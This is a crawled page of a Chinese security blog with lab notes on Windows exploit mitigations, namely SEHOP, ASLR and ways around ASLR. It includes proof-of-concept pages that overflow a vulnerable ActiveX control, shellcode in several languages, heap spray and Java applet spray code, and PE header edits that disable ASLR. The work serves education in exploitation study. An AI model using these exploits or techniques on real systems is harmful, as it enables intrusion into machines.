<h3 id="2-攻击SEHOP的理论方法"><a href="#2-攻击SEHOP的理论方法" class="headerlink" title="2. 攻击SEHOP的理论方法"></a>2. 攻击SEHOP的理论方法</h3><p>作为对SafeSEH强有力的补充，SEHOP检查是在SafeSEH的RtlIsValidHandler函数校验前进行的，也就是说利用攻击加载模块之外的地址、堆地址和未启用SafeSEH模块的方法都行不通了。理论上还有三条路可以：</p>
<ol>
<li>不去攻击SEH，而是攻击函数返回地址或者虚函数等</li>
<li>利用未启用SEHOP的模块</li>
<li>伪造SEH链</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/14/攻击ASLR的方法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/07/14/攻击ASLR的方法/" itemprop="url">攻击ASLR的方法</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-14T17:31:06+08:00">
                2017-07-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>攻击ASLR的方式很多，这里主要讲攻击未启用ASLR的模块、利用部分覆盖进行定位内存地址、利用Heap Spray技术定位内存地址、利用java applet heap spray技术定位内存地址、为.NET控件禁用ASLR</p>
<h3 id="1-攻击未启用ASLR的模块"><a href="#1-攻击未启用ASLR的模块" class="headerlink" title="1. 攻击未启用ASLR的模块"></a>1. 攻击未启用ASLR的模块</h3><p>ASLR仅仅只是安全机制，不是行业标准，不支持ASLR的软件很多，它们的加载基址固定，如果能够在当前控件中找到这样的模块，就可以利用它里面的指令作跳板，无视ASLR。Adobe Player ActiveX9就不支持ASLR。</p>
<p>我们可以使用下面的方式测试：</p>
<ol>
<li>具有溢出漏洞的ActiveX控件</li>
<li>不启用ASLR的Flash9e.ocx</li>
<li>可以触发ActiveX控件溢出漏洞的POC页面</li>
</ol>
<h4 id="1-1-ActiveX、POC代码"><a href="#1-1-ActiveX、POC代码" class="headerlink" title="1.1 ActiveX、POC代码"></a>1.1 ActiveX、POC代码</h4><pre><code>
void CVulnerAXCtrl::test(LPCTSTR str)
{
    // AFX_MANAGE_STATE(AfxGetStaticModuleState());
    // TODO: Add your dispatch handler code here
    printf("aaaa");
    char dest[100];
    sprintf(dest, "%s", str);
}
</code></pre>

<font color="#f00">这里面有一个巨大的坑点，就是在vista上安装好了adobe player activex 9之后，需要重启，否则在IE上打不开map.swf文件</font>

<p>POC.html</p>
<pre><code>
&lt;html&gt;
&lt;body&gt;
&lt;object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,115,0" width="160" height="260"&gt;  
&lt;param name="movie" value="map.swf" /&gt;  
&lt;param name="quality" value="high" /&gt;  
&lt;embed src="map.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="160" height="260"&gt;&lt;/embed&gt;
&lt;/object&gt; 
&lt;object classid="clsid:2554812E-4AE1-4FB0-8F6B-9C5E824D1B2D" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while (s.length &lt; 54) {
    s += "\u9090";
}
s += "\uEC2F\u3015\u9090\u9090";
s += "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
test.test(s);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<h4 id="1-2-实验内容"><a href="#1-2-实验内容" class="headerlink" title="1.2 实验内容"></a>1.2 实验内容</h4><p><b>实验内容</b></p>
<ol>
<li>为了直观反映ASLR，本次不是用ActiveX控件不使用GS</li>
<li>通过WEB页面同时加载具有溢出漏洞的ActiveX和Flash9e.ocx</li>
<li>又有IE7和DEP是关闭的，所以不用考虑DEP影响</li>
<li>函数test存在典型的溢出</li>
<li>Flash9k.ocx未启用ASLR，所以其加载地址是固定的，只需要在其内部寻找合适的跳板指令来跳转到shellcode</li>
</ol>
<p><b>实验环境</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows Vista SP0</td>
<td></td>
</tr>
<tr>
<td>DEP状态</td>
<td>Optin</td>
<td>Vista默认状态</td>
</tr>
<tr>
<td>浏览器</td>
<td>IE7</td>
<td></td>
</tr>
<tr>
<td>Flash Player版本</td>
<td>9.0.115</td>
</tr>
</tbody>
</table>
<p>经过某次测试，得到溢出字符串的起始地址0x0337F4B4<br>返回地址所在栈中地址：0x0337F520。所以覆盖返回地址需要填充108个0x90，也即54个\u9090</p>
<p>书上的解释：<br>我们使用0x1014D286处的MOV EAX,EDX RETN 8来调整EAX，而作为机器码时，其代表：<br>86D2    XCHG DL,DL<br>1410     ADC AL, 10<br>可以看出其不会对正常的程序有影响。<br>接下来用4字节的0x90填充消除test函数返回时的4字节偏移。<br>接着是用0x1012E78A来(JMP ESI)跳转至shellcode<br>跟着是0x90填充</p>
<p>实验测试：<br>0x3015EC2F: jmp esp</p>
<font color="#f00">POC中的第一个classid的值一般不变，对应的cab应该与安装的flash版本一致。<br>第一个object的作用是提前加载swf文件，这样在调试的时候就能看到Flash9e.ocx内容</font>

<h3 id="2-利用部分覆盖进行定位内存地址"><a href="#2-利用部分覆盖进行定位内存地址" class="headerlink" title="2. 利用部分覆盖进行定位内存地址"></a>2. 利用部分覆盖进行定位内存地址</h3><p>映像随机化只会对映像加载基址的前2个字节做随机化处理。</p>
<h4 id="2-1-实验代码"><a href="#2-1-实验代码" class="headerlink" title="2.1 实验代码"></a>2.1 实验代码</h4><pre><code>
#include "stdafx.h"
#include "stdlib.h"

char shellcode[] = 
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x00\x30";

char* test()
{
    char tt[256];
    //__asm int 3
    memcpy(tt, shellcode, 262);
    return tt;
}

int _tmain(int argc, _TCHAR* argv[])
{
    char temp[200];
    test();
    return 0;
}
</code></pre>

<h4 id="2-2-实验内容"><a href="#2-2-实验内容" class="headerlink" title="2.2 实验内容"></a>2.2 实验内容</h4><p><b>实验思路</b></p>
<ol>
<li>不启用GS</li>
<li>禁用DEP</li>
<li>test存在典型的溢出漏洞</li>
<li>复制结束后，test函数返回tt字符数组的首地址</li>
<li>在相对程序加载基址0x0000~0xFFFF的范围内，找到一条跳板指令，并用它地址的后两个字节覆盖返回地址的后两个字节</li>
<li>采用这种“相对寻址”的方法来动态确定跳板指令的地址，以实现跳板指令的通用性</li>
</ol>
<p><b>实验环境</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows Vista SP0</td>
<td></td>
</tr>
<tr>
<td>DEP状态</td>
<td>Optin</td>
<td>Vista默认状态</td>
</tr>
<tr>
<td>编辑器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>优化选项</td>
<td>禁用优化选项</td>
<td></td>
</tr>
<tr>
<td>GS选项</td>
<td>GS关闭</td>
<td></td>
</tr>
<tr>
<td>DEP选项</td>
<td>/NXCOMPAT:NO</td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>release</td>
</tr>
</tbody>
</table>
<p>溢出字符串起始地址：0x0016F64C<br>返回地址在栈中地址：0x0016F750</p>
<p>memcpy之后，复制的地址可能不知道，但是复制到哪儿，却是很清楚！</p>
<h3 id="3-利用Heap-Spray技术定位内存地址"><a href="#3-利用Heap-Spray技术定位内存地址" class="headerlink" title="3. 利用Heap Spray技术定位内存地址"></a>3. 利用Heap Spray技术定位内存地址</h3><h4 id="3-1-实验代码"><a href="#3-1-实验代码" class="headerlink" title="3.1 实验代码"></a>3.1 实验代码</h4><p>POC代码</p>
<pre><code>
&lt;html&gt;
&lt;body&gt;
&lt;script&gt;
var nops = unescape("%u9090%u9090");
var shellcode = "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
while (nops.length &lt;0x100000/2)
    nops += nops;
nops = nops.substring(0, 0x100000/2-32/2-4/2-2/2-shellcode.length);
nops = nops+shellcode;
var memory = new Array();
for (var i=0; i&lt;200; i++)
    memory[i] += nops;
&lt;/script&gt;
&lt;object classid="clsid:2554812E-4AE1-4FB0-8F6B-9C5E824D1B2D" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while (s.length &lt; 54){
    s += "\u9090";
}
s += "\u0C0C\u0C0C";
test.test(s)
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<h4 id="3-2-实验内容"><a href="#3-2-实验内容" class="headerlink" title="3.2 实验内容"></a>3.2 实验内容</h4><p>利用JS申请200个1MB的内存块，观察内存块的起始地址的变化情况。为了便于确定内存块的起始位置，我们在内存块的开始位置放置0x81828182，然后查找来确定内存块的起始位置！</p>
<p>由于Heap Spray是针对浏览器的，所以这儿仍然使用ActiveX来进行演示！为了测试，一般将EIP指向0x0C0C0C0C这个位置！！</p>
<p><b>实验思路</b></p>
<ol>
<li>利用Heap Spray技术在内存中申请200个1MB的内存块来对抗ASLR的随机化处理</li>
<li>每个内存块中包含着0x90填充和shellcode</li>
<li>Heap Spray结束后我们会占领0x0C0C0C0C附近的内存，我们只需要控制程序转入0x0C0C0C0C执行，在执行若干个0x90滑行之后就可以到达shellcode范围并执行</li>
<li>test函数存在典型的溢出漏洞，此处用的VulnerAX.ocx中的ActiveX控件</li>
<li>我们将函数返回地址覆盖为0x0C0C0C0C，函数执行返回执行后就会转入我们申请的内存空间中</li>
</ol>
<h3 id="4-利用java-applet-heap-spray技术定位内存地址"><a href="#4-利用java-applet-heap-spray技术定位内存地址" class="headerlink" title="4. 利用java applet heap spray技术定位内存地址"></a>4. 利用java applet heap spray技术定位内存地址</h3><font color="#f00">Java applet能绕过DEP，是因为JVM分配Java applet申请的空间时将其申请的空间打上了PAGE_EXECUTE_READWRITE标识，让这段内存具有可执行属性!<br>其实在java applet中可以采用类似Heap spray的方法，在JVM的堆空间中申请大量的内存块来对抗ASLR！<br>与Heap Spray不同的是，Heap Spray最大可申请1GB的空间，而每个Java applet最多能申请100MB的空间。为此我们申请90MB空间！！<br></font>

<h4 id="4-1-实验代码"><a href="#4-1-实验代码" class="headerlink" title="4.1 实验代码"></a>4.1 实验代码</h4><p>AppletSpray.java</p>
<pre><code>
import java.applet.*;
import java.awt.*;

public class AppletSpray extends Applet{
    public void init(){
        String shellcode = "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
        String[] mem = new String[1024];
        StringBuffer buffer = new StringBuffer(0x100000/2);
        // header (12 bytes)  nop (0x10000-32-2-x) shellcode(x)  NULL(2)
        for(int i=0;i<(0x100000-12-2) 2-shellcode.length();i++)="" buffer.append("\u9090");="" buffer.append(shellcode);="" runtime.getruntime().gc();="" for(int="" j="0;j<90;j++)" mem[j]="" +="buffer.toString();" }="" <="" code=""></(0x100000-12-2)></code></pre>

<p>POC.html</p>
<pre><code>&lt;html&gt;
&lt;body&gt;
&lt;applet code=AppletSpray.class width=300 height=50&gt;&lt;/applet&gt;
&lt;object classid="clsid:2554812E-4AE1-4FB0-8F6B-9C5E824D1B2D" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while(s.length &lt; 54){
    s += "\u9090";
}
s += "\u0A0A\u110A";
test.test(s);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<h4 id="4-2-实验内容"><a href="#4-2-实验内容" class="headerlink" title="4.2 实验内容"></a>4.2 实验内容</h4><p><b>实验环境：</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows Vista SP0</td>
<td></td>
</tr>
<tr>
<td>DEP状态</td>
<td>Optin</td>
<td>该选项任意，因为这种方法可以绕过DEP</td>
</tr>
<tr>
<td>浏览器</td>
<td>IE7</td>
<td></td>
</tr>
<tr>
<td>Java JDK</td>
<td>1.4.2</td>
<td>1.5以前的均可</td>
</tr>
<tr>
<td>目标版本</td>
<td>1.1</td>
<td>脱离JRE，在不具有JRE机器上也能执行</td>
</tr>
<tr>
<td>JRE</td>
<td>不使用JRE</td>
<td></td>
</tr>
<tr>
<td>Applet编译指令</td>
<td>javac 路径\Shellcode.java -target 1.1</td>
</tr>
</tbody>
</table>
<p><b>Java Applet申请空间测试代码</b></p>
<pre><code>
import java.applet.*;
import java.awt.*;

public class AppletSpray extends Applet{
    public void init(){
        String[] mem = new String[1024];
        StringBuffer buffer = new StringBuffer(0x100000/2);
        buffer.append("\u8281\u8182");
        for(int i=0;i<(0x100000-16) 2;i++)="" buffer.append("\u9090");="" runtime.getruntime().gc();="" for(int="" j="0;j<90;j++)" mem[j]="" +="buffer.toString();" }="" <="" code=""></(0x100000-16)></code></pre>

<p><b>Java Applet申请空间起始地址测试结果</b></p>
<table>
<thead>
<tr>
<th>重启前</th>
<th>内存起始地址</th>
<th>重启后</th>
<th>内存起始地址范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>0x10010014-0x13F5FDE4</td>
<td>1</td>
<td>0x10010014-0x13F4CC10</td>
</tr>
<tr>
<td>2</td>
<td>0x10010014-0x13F4CC10</td>
<td>2</td>
<td>0x10010014-0x13F5A3E8</td>
</tr>
</tbody>
</table>
<p>从表中可以看出4次试验均有一定的交集，这说明90MB的空间基本上可以对抗ASLR了。不妨使用0x110A0A0A作为切入点，只要将攻击函数的返回地址覆盖为0x110A0A0A，经过若干个0x90的滑行就可以执行shellcode了</p>
<h3 id="5-为-NET控件禁用ASLR"><a href="#5-为-NET控件禁用ASLR" class="headerlink" title="5. 为.NET控件禁用ASLR"></a>5. 为.NET控件禁用ASLR</h3><h4 id="5-1-原理解读"><a href="#5-1-原理解读" class="headerlink" title="5.1 原理解读"></a>5.1 原理解读</h4><p>当.NET控件的IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识移除后，这个.NET控件依然会随机加载。</p>
<p>ASLR对PE文件是否启用随机化处理的校验过程：</p>
<pre><code>
if(!(pBinaryInfo->pHeaderInfo->usDllCharacteristics & IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE) && 
!(pBinaryInfo->pHeaderInfo->bFlags & PINFO_IL_ONLY_IMAGES) &&
!(_MmMoveImages == -1))
{
    _MiNoRelocate++;
    return 0;
}
</code></pre>

<p>从代码中可以看出，只要满足下列任意条件就会对PE文件进行随机化处理</p>
<ol>
<li>PE头含有IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识</li>
<li>IL-Only文件，这是对.NET文件进行了特殊照顾</li>
<li>_MmMoveImages 值为-1</li>
</ol>
<p>由上可以若一个文件是IL-Only文件，无论是否设置了IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识，都会随机化加载。而加载到浏览器中的.NET控件恰恰是IL-Only的。</p>
<p>系统验证.NET是否是IL-Only文件过程</p>
<pre><code>
if(((pCORHeader->MajorRuntimeVersion>2)|(pCORHeader->MajorRuntimeVerion == 2 && pCORHeader->MinorRuntimeVersion>=5)) &&
(pCORHeader->Flags & COMIMAGE_FLAGS_ILONLY))
{
    pImageControlArea->pBinaryInfo->pHeaderInfo->bFlags != PINFO_IL_ONLY_IMAGE;
    ……
}
</code></pre>

<p>通过分析代码，可以发现当系统在检查一个.NET文件是否具有COMIMAGE_FLAGS_ILONLY标识前分别对.NET文件运行时版本号进行判断，如果版本号低于2.5则不运行COMIMAGE_FLAGS_ILONLY标识校验，这个文件就不会被认定为IL-Only！</p>
<p>如果.NET文件被指定加载基址，而其不包含IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识，又不被认定为IL-Only，就可以不被ASLR</p>
<h4 id="5-2-实验工具"><a href="#5-2-实验工具" class="headerlink" title="5.2 实验工具"></a>5.2 实验工具</h4><p>我们可以使用CFF Explorer软件来修改.NET控件的PE头<font color="#0f0">[该软件在吾爱破解工具包中有]</font></p>
<p>首先去掉文件IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识，用CFF Explorer打开DEP_NETDLL.dll后，点击Optional header-&gt;DllCharacteristics进行设置<br><img src="/images/2017-07-14/remove_dll_characteristics.jpg" alt="去掉IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识"></p>
<p>然后设置.NET控件的运行版本号，修改至小于2.5即可。在.NET Directory选项页中设置，修改完之后保存即可</p>
<h4 id="5-3-实验测试"><a href="#5-3-实验测试" class="headerlink" title="5.3 实验测试"></a>5.3 实验测试</h4><p>本实验测试沿用<a href="/2017/07/12/攻击DEP的方法-下/">利用.NET绕过DEP</a>，不过不同的是本次实验是在Vista上完成的</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/14/内存随机化保护-ASLR-简介/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/07/14/内存随机化保护-ASLR-简介/" itemprop="url">内存随机化保护(ASLR)简介</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-14T16:39:22+08:00">
                2017-07-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>ASLR(Address Space Layout Randomization)技术就是通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制。</p>
<p>支持ASLR的程序在其PE头中会设置IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识来说明其支持ASLR。从VS 2005 SP1开始加入/dynamicbase链接选项来帮我们完成这个任务。本书使用VS 2008(VS 9.0)中，通过Project-&gt;project Properties-&gt;Configuration Properties-&gt;Linker-&gt;Advanced-&gt;Randomized Base Address选项对/dynamicbase链接选项进行设置。</p>
<p>ASLR一般分为映像随机化、堆栈随机化、PEB与TEB随机化</p>
<h3 id="1-映像随机化"><a href="#1-映像随机化" class="headerlink" title="1. 映像随机化"></a>1. 映像随机化</h3><p>映像随机化是在PE文件映射到内存时，对其加载的虚拟地址进行随机化处理，这个地址在系统启动时确定，系统重启后该地址会变化。</p>
<p>以IE为例<br><img src="/images/2017-07-14/aslr_image.jpg" alt="对比"></p>
<p>系统中设置了映像随机化的开关，用户可以通过设置注册表中的HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\MoveImages的键值来设定映像随机化的工作模式</p>
<ul>
<li>0： 映像随机化被禁用</li>
<li>-1： 强制对可随机化的映像进行处理，无论是否设置IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识</li>
<li>其他值：正常工作模式，只对具有随机化处理标识的映像进行处理</li>
</ul>
<h3 id="2-堆栈随机化"><a href="#2-堆栈随机化" class="headerlink" title="2. 堆栈随机化"></a>2. 堆栈随机化</h3><p>在运行时随机的选择堆栈的基址，与映像基址随机化不同的是堆栈的基址不是在系统启动的时候确定的，而是在打开程序的时候确定的</p>
<pre><code>
int _tmain(int argc, _TCHAR* argv[])
{
    char * heap = (char *)malloc(100);
    char stack[100];
    printf("Address of heap:%#0.4x\nAddress of stack %#0.4x", heap, stack);
    getchar();
    return 0;
}
</code></pre>

<p>使用win xp和win vista进行对比，如下：<br>win xp两次运行的结果：<br><img src="/images/2017-07-14/win_xp_heap_stack.jpg" alt="win_xp两次运行的结果"><br>win vista两次运行的结果：<br><img src="/images/2017-07-14/win_vista_heap_stack.jpg" alt="win_vista两次运行的结果"></p>
<h3 id="3-PEB与TEB"><a href="#3-PEB与TEB" class="headerlink" title="3. PEB与TEB"></a>3. PEB与TEB</h3><p>PEB与TEB随机化在win xp sp2就引入了，不再使用固定的PEB基址0x7FFDF00和TEB基址0x7FFDE00</p>
<font color="#f00">获取当前进程的TEB和PEB很简单，TEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30处的位置。获取TEB、PEB的方法如下：</font>

<pre><code>
int _tmain(int argc, _TCHAR* argv[])
{
    unsigned int teb;
    unsigned int peb;
    __asm{
        mov eax, FS:[0x18]
        mov teb, eax
        mov eax, dword ptr [eax + 0x30]
        mov peb, eax
    }
    printf("PEB:%#x\nTEB:%#x", peb, teb);
    getchar();
    return 0;
}
</code></pre>

<p>PEB、TEB随机化测试:<br><img src="/images/2017-07-14/aslr_teb_peb.jpg" alt="PEB、TEB随机化"></p>
<h3 id="4-ASLR存在的缺陷"><a href="#4-ASLR存在的缺陷" class="headerlink" title="4. ASLR存在的缺陷"></a>4. ASLR存在的缺陷</h3><ol>
<li>映像随机化测试时各模块的入口点（Entry那列）地址的低位2个字节时不变的，也就是说映像随机化只是对加载基址的前2字节做了随机处理</li>
<li>堆栈随机化可以防止精准攻击，但是使用JMP ESP跳板、浏览器攻击中的heap spray等技术是不需要精准跳转</li>
<li>PEB与TEB的随机化的程度较差，而且即使做到完全随机，依然可以使用其他方法获取当前进程的PEB与TEB</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/me.jpg"
               alt="Introspelliam" />
          <p class="site-author-name" itemprop="name">Introspelliam</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
           
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
            
              <a href="/archives/">
            
                <span class="site-state-item-count">132</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">16</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">55</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      GitHub
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
